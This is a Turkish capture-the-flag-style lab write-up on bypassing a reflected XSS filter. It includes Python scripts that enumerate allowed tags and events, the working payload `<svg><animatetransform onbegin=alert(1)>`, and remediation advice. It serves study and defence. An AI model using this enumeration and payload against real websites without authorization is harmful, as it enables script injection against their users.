# XSS Lab #8: Reflected XSS with some SVG markup allowed (filter bypass)

- **Seviye:** Practitioner (ilk Practitioner XSS + ilk filter bypass)
- **Sınıf:** Cross-Site Scripting — filter/WAF bypass
- **Yöntem:** Körleme + Python brute-force (iki aşamalı)
- **Araç:** Python requests + tarayıcı

---

## Neden bu lab önemli?

Şimdiye kadarki XSS'lerde **context okuyup** payload seçiyordum. Gerçek hedeflerde ise `<script>`
neredeyse her zaman **bloklanır**. Bu lab o gerçeğin provası: filtre var, ve asıl beceri
"bloklanınca ne yapılacağını" bilmek.

## Zihniyet değişimi (asıl ders) 🔑

> **"Ne çalışır?" diye tahmin etme — "ne İZİNLİ?" diye sistematik haritala.**

Filtrenin kurallarını bilmezsin. O yüzden önce **izinli parçaları keşfedersin** (tag → event),
sonra payload'u **sadece izinli parçalardan** kurarsın. Kör tahmin değil, **whitelist keşfi.**
Python bu keşfi hızlandıran araç — fikir değil.

## Çözüm (iki aşamalı Python brute-force)

İlk deneme: `<script>alert(1)</script>` → **"Tag is not allowed"** (filtre burada).

### Aşama 1 — İzinli TAG'leri bul
```python
import requests
url = "https://LAB-ID.web-security-academy.net/"
tags = ["svg","animatetransform","title","image","desc","animate","set","a","img","script"]
for t in tags:
    r = requests.get(url, params={"search": f"<{t}>"})
    if "not allowed" not in r.text.lower():
        print("İZİNLİ tag:", t)
```
Sonuç: **svg, animatetransform, title, image** izinli.

### Aşama 2 — İzinli EVENT'i bul (izinli bir tag üstünde)
```python
events = ["onbegin","onend","onload","onstart","onrepeat","onactivate","onfocus","onclick"]
for e in events:
    r = requests.get(url, params={"search": f"<animatetransform {e}=1>"})
    if "not allowed" not in r.text.lower():
        print("İZİNLİ event:", e)
```
Sonuç: **onbegin** izinli.

> Sıra önemli: önce event'i barındıracak **izinli bir tag** lazım, sonra o tag'de **izinli event**.
> Anomali sinyali yine tanıdık: yanıtta "not allowed" var mı yok mu (SSRF/Auth taramalarının aynısı).

### Aşama 3 — Birleştir
```
<svg><animatetransform onbegin=alert(1)>
```
`search` kutusuna konur. `<svg>` içindeki `animatetransform` animasyonu **otomatik başlar** →
`onbegin` ateşlenir → `alert(1)` çalışır → **çözüldü.**

## Takıldığım precision noktası

İlk payload denemem: `<svg>alert(1)<animatetransform ONBEGIN=KOD>` → çalışmadı. İki hata:
1. `alert(1)`'i tag'ler arasına **metin** olarak koymuşum → tarayıcı onu **yazı** sanır, çalıştırmaz.
2. `ONBEGIN=KOD` placeholder'ını doldurmamışım.

**Ders:** Kod, tag'ler arası metin değil, **event handler'ın DEĞERİ** olmalı: `onbegin=alert(1)`.
- `<tag>alert(1)</tag>` → metin içerik (çalışmaz).
- `<tag onbegin=alert(1)>` → event handler değeri = **kod** (event ateşlenince çalışır).

## Neden `animatetransform` + `onbegin`?

- `animatetransform` bir **SVG animasyon** elementi; `<svg>` içinde olunca animasyon otomatik başlar.
- `onbegin`, animasyon **başladığında** tetiklenen event → kullanıcı etkileşimi beklemeden ateşlenir.
- Yani payload, kurban sayfayı açar açmaz çalışır.

## Remediation (defender)

1. **Context-aware output encoding:** kullanıcı girdisini encode et; `<`, `>` → `&lt;`, `&gt;`.
   "Veri" olarak dursun, asla "markup" olarak yorumlanmasın.
2. **Allowlist yerine tam encoding'e güven:** "şu tag'lere izin ver" yaklaşımı kırılgandır
   (bu lab onu kanıtlıyor — izin verilen SVG tag'leri event taşıyabildi). Mümkünse HTML üretimini
   framework'ün güvenli template engine'ine bırak (otomatik escape).
3. **CSP:** `script-src` ve inline event handler kısıtlaması (`unsafe-inline` kapat) → event
   handler'lar çalışmaz.
4. **Zengin içerik gerekiyorsa** olgun bir sanitizer (DOMPurify gibi) kullan; kendi tag filtreni yazma.

## Zincir bağı

- XSS #1–7: context okuma (HTML, attribute, JS string, DOM sink'leri).
- XSS #8 (bu): **filter bypass** — context'i okuyorsun + üstüne filtreyi **enumerate** ediyorsun.
- Gerçek hedef köprüsü: bu "izinliyi haritala" refleksi, canlı sitelerde en çok kullanılacak XSS becerisi.
- Python brute-force: SSRF (iç ağ tarama) ve Auth (username enum) ile aynı anomali-avı deseni,
  yeni bağlamda.

## Köşe taşı

> Filtre seni bloklayınca tahmin etme; **neyin geçtiğini sistematik ölç**, sonra payload'u yalnızca
> geçen parçalardan kur. Ve kod, metin değil, bir **event handler'ın değeri** olduğunda çalışır.
